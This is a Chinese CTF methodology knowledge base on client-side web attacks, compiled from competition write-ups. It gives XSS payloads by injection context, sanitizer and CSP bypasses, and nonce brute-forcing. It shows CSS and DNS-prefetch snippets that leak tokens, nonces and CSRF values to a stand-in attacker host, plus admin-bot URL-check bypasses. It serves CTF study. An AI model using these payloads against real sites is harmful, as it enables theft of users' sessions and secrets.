# 客户端攻击判据库

> 来源：`web/赛事专题/Writeup合集` 中 49 篇涉及客户端的 WP（227 条观测 / 135 条失败尝试）。
> 主库 `漏洞分类/XSS/`、`CSP绕过/`、`client-side.md` 已有基础，
> 本文补**CSP 数值判据**、**bot 行为判据**、**无脚本外带**三类。

## 0. 判据速查

| 现象 | 判据 | 去哪节 |
|---|---|---|
| 能注入 HTML 但 `<script>` 不执行 | CSP 拦了内联脚本 | §2 |
| `script-src 'nonce-xxx'` 且 nonce 很短 | nonce 可爆破 | §2.2 |
| `style-src 'unsafe-inline'` 存在 | CSS 可注入，能偷属性值 | §2.3 |
| `<img onerror>` 不触发 | 事件处理器属性被净化 | §1.2 |
| 净化后又做了字符串拼接 | 净化结果被二次加工，可绕 | §1.3 |
| 有 admin bot，但只接受特定链接 | bot 的入口字段有限制 | §3.1 |
| bot 访问后立刻跳走 | 需要在跳走前把数据送出 | §3.2 |
| 完全无法执行脚本 | 用 CSS / DNS / 表单外带 | §4 |
| 需要逐字符猜值 | 用 iframe + focus + activeElement | §4.3 |

## 1. 注入点与输出上下文

**判据**：先判「注入的字符串落在 HTML 的哪个位置」，位置决定 payload 形态。

### 1.1 四种上下文

| 上下文 | 特征 | 起始 payload |
|---|---|---|
| HTML 标签之间 | `<div>INPUT</div>` | `<img src=x onerror=alert(1)>` |
| 标签属性内（双引号） | `value="INPUT"` | `" onmouseover="alert(1)` |
| 标签属性内（单引号） | `value='INPUT'` | `' onmouseover='alert(1)` |
| `<script>` 内 | `var a = "INPUT"` | `";alert(1);//` |
| URL 属性内 | `href="INPUT"` | `javascript:alert(1)` |

判据是**闭合符是什么**。闭合符被转义时，换 `</script>` 或 `-->` 之类的结构逃逸。

### 1.2 净化器的绕过判据

| 净化器 | 判据 | 绕过 |
|---|---|---|
| `htmlspecialchars` | `<` `>` `"` `'` 全转义 | 属性内无引号时可用空格分隔 |
| DOMPurify（默认） | 移除 `on*` 与 `<script>` | 用 `<svg><animate onbegin=>`（视版本） |
| DOMPurify `config={}` | 配置被显式置空 | 直通，不用绕 |
| 自定义正则 | 只匹配小写 `onerror` | `OnErRoR`、`onerror` 加换行 |
| `strip_tags` | 只留白名单标签 | 用白名单标签的属性 |

**关键判据**：净化发生在**输出前还是输出后**。净化后再拼接，等于没净化。

### 1.3 二次加工绕过

```php
$clean = purify($input);
echo "<div>$clean</div>";
$clean = str_replace('x', '<img src=x onerror=alert(1)>', $clean);  // 净化后才注入
```

判据是**代码里净化函数之后还有没有字符串操作**。有就是绕过点。

## 2. CSP

**判据**：先完整读 CSP 头，逐条对下表。

### 2.1 指令与攻击面

| 指令 | 允许什么 | 攻击面 |
|---|---|---|
| `script-src 'self'` | 同源脚本 | 找同源 JSONP / 上传点 |
| `script-src 'unsafe-inline'` | 内联脚本 | 直接 `<script>` |
| `script-src 'unsafe-eval'` | `eval`/`Function` | 有 eval 注入点即可 |
| `script-src 'nonce-xxx'` | 带该 nonce 的脚本 | nonce 可预测/可爆破/可偷 |
| `script-src 'strict-dynamic'` | 已信任脚本创建的脚本 | 找已有脚本的注入点 |
| `style-src 'unsafe-inline'` | 内联 CSS | CSS 注入偷属性 |
| `frame-src 'none'` | 禁止 iframe | 换 `window.open` |
| `object-src 'none'` | 禁插件 | — |
| `base-uri 'self'` | 限制 `<base>` | 不能改 base |
| `default-src` 带 Host 头 | 头可污染 | 改 Host 让 CSP 指向自己 |

**最高价值的三条**：`style-src 'unsafe-inline'`（能偷 nonce）、`'strict-dynamic'`（找注入点）、`default-src` 引用请求头（可污染）。

### 2.2 nonce 爆破

判据是**nonce 长度**：

```text
nonce 是 3 字符 a-z0-9  → 36³ = 46656 种，可爆破
nonce 是 4 字符         → 1.6M，勉强
nonce ≥ 16 字节         → 不可爆破（这是 CSP 规范建议的下限）
```

爆破手法（CSS 属性选择器）：

```css
/* 每个候选 nonce 一条规则，命中就发请求 */
script[nonce^="aaa"] { background: url(//attacker/leak?n=aaa) }
script[nonce^="aab"] { background: url(//attacker/leak?n=aab) }
```

**关键**：单个 `<style>` 能塞的规则数有上限（约 1.5 万条），46656 条要分 3 批。一次塞爆会让浏览器崩溃。

`background-image` 不一定触发，`webkit-cross-fade` 是可靠的触发函数。

### 2.3 CSS 注入偷值

有 `style-src 'unsafe-inline'` 时，即使不能执行 JS，也能偷属性值：

```css
input[value^="a"] { background: url(//attacker/?v=a) }
input[value^="b"] { background: url(//attacker/?v=b) }
```

判据是**目标值在 DOM 属性里**（`value`、`href`、`src`、`nonce`）。逐字符前缀匹配即可。

## 3. admin bot

**判据**：题目提供「提交链接给管理员访问」的功能。

### 3.1 bot 的入口限制

```text
只接受特定域名  → 需要在自己域名上做跳转
只接受特定路径  → 找该路径的开放重定向
访问后立即关闭  → 必须在页面加载时同步外带
带 cookie 访问   → cookie 的 domain 决定能否读到
```

判据是**bot 的校验逻辑**。常见只校验 `startsWith('http://target/')`，用 `http://target/@attacker/` 或 `http://target/../` 绕。

### 3.2 时间窗口

```text
bot 等待 5 秒   → 外带必须在 5 秒内完成，不要用 setTimeout 延迟
bot 等待 30 秒  → 可以分步
bot 访问即关闭  → 用 fetch + keepalive，或 <img> 同步请求
```

**关键**：`setTimeout` 在 bot 关闭页面后不执行。必须**同步发起请求**（`<img src>`、`fetch(..., {keepalive:true})`）。

### 3.3 拿 cookie 的三种情况

| cookie 属性 | 能否 `document.cookie` 读到 |
|---|---|
| 无 `HttpOnly` | 能 |
| 有 `HttpOnly` | 不能，需从 DOM/接口拿 |
| `SameSite=Strict` | bot 从外站跳进来时**不带** |

判据是 **`HttpOnly` 与 `SameSite` 的组合**。`HttpOnly` 时改打「页面里渲染出的 token」，或找 `XSS + CSRF` 组合。

## 4. 无脚本外带

**判据**：完全不能执行 JS（CSP 全禁 + 无 `unsafe-inline`）。

### 4.1 三条通道

```text
1. CSS background-image → 需要 style-src 允许
2. DNS 预取 <link rel=dns-prefetch href="//data.attacker">
3. 表单自动提交 → 需要能注 <form>，且能触发 submit
```

### 4.2 CSS 外带的完整链

```html
<style>
@import url(//attacker/start);           /* 通知开始 */
input[name=csrf][value^="a"] { background: url(//attacker/?c=a) }
</style>
```

判据是**目标值在能被 CSS 选择器匹配的位置**。

### 4.3 逐字符猜值（无 CSS 时）

```html
<iframe name="x" src="//target/page"></iframe>
<script>/* 不能执行时无效 */</script>
```

有 `unsafe-inline` 时可用 `iframe + focus + activeElement` 做时间侧信道（XS-Leak）：

```js
// 逐字符判定：让 iframe 内 focus 到匹配的元素，看当前窗口的 activeElement 是否变化
```

判据是**目标页面有可被 focus 的元素且值可控**。这是最高阶的手法，成本也最高。

## 5. 纪律

- **先读完整 CSP 头再设计 payload**。少读一条指令就会设计出必然失败的 payload。
- **`style-src 'unsafe-inline'` 是最高价值的发现**，它让 CSS 注入成为可能，比找 JS 执行容易得多。
- **nonce 长度决定能不能爆破**，≥16 字节就别试了。
- **bot 的 `setTimeout` 不可靠**，必须同步外带。
- **`HttpOnly` 不等于无解**，改打 DOM 里的 token 或组合 CSRF。
- **净化后再拼接 = 没净化**，这是自定义净化器最常见的洞。
- **`SameSite=Strict` 的 cookie 不会随跨站跳转发送**，这条能直接否掉一批 CSRF 思路。
